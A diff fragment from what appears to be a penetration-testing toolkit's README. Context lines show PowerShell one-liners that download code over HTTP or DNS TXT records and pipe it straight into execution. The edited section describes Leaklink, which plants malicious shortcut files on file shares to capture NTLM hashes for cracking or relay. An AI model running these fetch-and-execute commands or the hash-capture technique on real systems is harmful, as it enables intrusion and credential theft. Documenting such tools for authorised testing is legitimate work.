@@ -204,9 +204,9 @@ ps> iwr http://domain_oneline.txt | iex
 ps> (Resolve-DnsName domain_oneline.txt -Type TXT).strings -join '' | iex
 ```
 
-*[3] Leak Link NTLM Relay*
+*[3] [Leaklink](./tools/leaklink/) NTLM Relay*
 
-[leaklink.py](./tools/leaklink/) is used for uploading malicious shortcut files to insecure file shares. The vulnerability exists due to Windows looking for an icon file to associate with the shortcut file it will activate with the right click  on the file. This icon file can be directed to a penetration tester's machine running Responder or smbserver to gather NTLMv1 or NTLMv2 hashes (depending on configuration of the victim host machine). The tester can then attempt to crack those collected hashes offline with a tool like Hashcat, or relay them to a tool like ntlmrelayx for further exploitation.
+It is used for uploading malicious shortcut files to insecure file shares. The vulnerability exists due to Windows looking for an icon file to associate with the shortcut file it will activate with the right click  on the file. This icon file can be directed to a penetration tester's machine running Responder or smbserver to gather NTLMv1 or NTLMv2 hashes (depending on configuration of the victim host machine). The tester can then attempt to crack those collected hashes offline with a tool like Hashcat, or relay them to a tool like ntlmrelayx for further exploitation.
 Running the python script:
 
 ```bash
